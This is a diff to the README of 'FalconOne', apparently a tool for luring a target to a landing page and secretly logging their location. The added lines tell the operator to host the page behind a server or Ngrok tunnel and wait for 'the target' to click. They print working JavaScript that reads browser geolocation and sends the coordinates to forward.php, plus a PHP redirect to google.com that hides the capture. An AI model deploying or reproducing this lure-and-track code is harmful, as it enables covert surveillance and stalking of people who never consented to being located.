@@ -72,7 +72,7 @@ FalconOne is coded as explained below:
 ## 4. Prerequisites
 
 - Apache or Nginx Server
-- IP Address or a Tunnel (e.g. Ngrok)
+- IP Address or a Tunnel (e.g. [Ngrok](https://ngrok.com/))
 - Domain Name (Recommended)
 - SSL Certificate (for a secure look)
 
@@ -89,7 +89,33 @@ FalconOne is coded as explained below:
 Once deployed, wait for the target to interact with the landing page functions such as buttons, links, images and popups.
 Once the Target interacts with the Landing page function(s), location(s) should be stored in info.txt and other information in log.txt.
 
-The PHP Functions in index.html and forward.php should not be changed or needs to be added in new HTML pages.
+The following PHP Functions logic in index.html should not be changed:
+
+```
+<p id="errorMessage"></p>
+
+<script>
+let message = document.getElementById("errorMessage");
+
+function getLocation(){
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(sendLocation);
+  } else{ 
+    message.innerHTML = "<em>Your browser is not supported.</em>";
+  }
+}
+
+function sendLocation(geoLocation) {
+  window.location = "forward.php?x="+geoLocation.coords.latitude+"&y="+geoLocation.coords.longitude;
+}
+</script>
+```
+
+In forward.php line 37, you can edit the default redirection URL which is google.com by default:
+
+```
+header('Location: https://www.google.com/');
+```
 
 
 ## 7. Community
